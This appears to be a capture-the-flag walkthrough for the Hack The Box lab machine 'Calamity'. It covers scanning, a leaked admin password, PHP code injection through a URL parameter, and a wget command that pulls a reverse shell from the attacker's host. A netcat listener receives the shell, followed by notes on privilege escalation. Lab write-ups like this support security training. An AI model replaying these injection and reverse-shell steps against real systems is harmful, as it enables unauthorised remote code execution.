# HTB - Calamity  10.10.10.27


- Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux
- Ubuntu 16.04.2 LTS 




## NMap

```# nmap -sC -sV -A 10.10.10.27 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 23:54 CEST
Nmap scan report for 10.10.10.27
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software

```


## http://10.10.10.27/

![](img/calamity.png)


## http://10.10.10.27/admin.php

![](img/calamity_login.png)

Credentials found in  Response : Burp or Page Source
```
<!-- password is:skoupidotenekes-->
```
==> admin:skoupidotenekes


Once loged, a cokkie is set.

Cookie: adminpowa=noonecares
Can change the cookie value, noone care..


http://10.10.10.27/admin.php?html=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
Command is subject to XSS

Try to wfuzz to get other command..

?html => Add html in page.

```
# wfuzz -z file,./burp-parameter-names.txt  http://10.10.10.27/admin.php?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.27/admin.php?FUZZ=echo
Total requests: 2588

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000067:  C=200     10 L	      25 W	    451 Ch	  "pass"
000068:  C=200     10 L	      25 W	    451 Ch	  "dir"
000069:  C=200     10 L	      25 W	    451 Ch	  "show"
000070:  C=200     10 L	      25 W	    451 Ch	  "h"
000071:  C=200     10 L	      25 W	    451 Ch	  "value"

# wfuzz -z file,./burp-parameter-names.txt --hh=451  http://10.10.10.27/admin.php?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.27/admin.php?FUZZ=echo
Total requests: 2588

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================


Total time: 8.836157
Processed Requests: 2588
Filtered Requests: 2588
Requests/sec.: 292.8874

```


## Found webpage http://10.10.10.27/uploads/



### php injection : <?php phpinfo(); ?>

Some injections
http://10.10.10.27/admin.php?html=%3C%3Fphp+system("pwd")%3B%3F%3E
http://10.10.10.27/admin.php?html=%3C%3Fphp+system("ls")%3B%3F%3E

Serve php-reverse-shell.php
Update IP & port in php.

http://10.10.10.27/admin.php?html=%3C%3Fphp+system(%22wget%20http://10.10.14.36/shell.php%20-O%20uploads/shell.php%22)%3B%3F%3E

http://10.10.10.27/uploads/shell.php


```
# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.27: inverse host lookup failed: Unknown host
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.27] 50122
Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux
 18:42:32 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## System

```
$ cat /etc/issue
Ubuntu 16.04.2 LTS \n \l

www-data@calamity:/home/xalvas$ uname -a
Linux calamity 4.4.0-81-generic #104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 athlon i686 GNU/Linux
www-data@calamity:/home/xalvas$ 

```


## Wav files

Download .wav files
- recov.wav
- rick.wav


sudo apt-get install audacity
load rick
import recov
invert rick

Play => 18547936..*

## ssh xalvas@10.10.10.27 : 18547936..*

### Exploit 1 : lxc

groups => lxd

lxc help

lxc is installed...
We can use docker exploit

- Walk: https://www.hackingarticles.in/hack-the-box-challenge-calamity-walkthrough/


### suid + buffer overflow

- Walk: https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139

```
$ cd app
$ readelf -W -l goodluck 2>/dev/null

Elf file type is DYN (Shared object file)
Entry point 0x7e0
There are 9 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x00000034 0x00000034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x00000154 0x00000154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x00000000 0x00000000 0x013ec 0x013ec R E 0x1000
  LOAD           0x001ee8 0x00002ee8 0x00002ee8 0x0017c 0x00198 RW  0x1000
  DYNAMIC        0x001ef4 0x00002ef4 0x00002ef4 0x000f0 0x000f0 RW  0x4
  NOTE           0x000168 0x00000168 0x00000168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x001124 0x00001124 0x00001124 0x00084 0x00084 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x001ee8 0x00002ee8 0x00002ee8 0x00118 0x00118 R   0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
   04     .dynamic 
   05     .note.ABI-tag .note.gnu.build-id 
   06     .eh_frame_hdr 
   07     
   08     .init_array .fini_array .jcr .dynamic .got 


$ cat /proc/sys/kernel/randomize_va_space
0

```

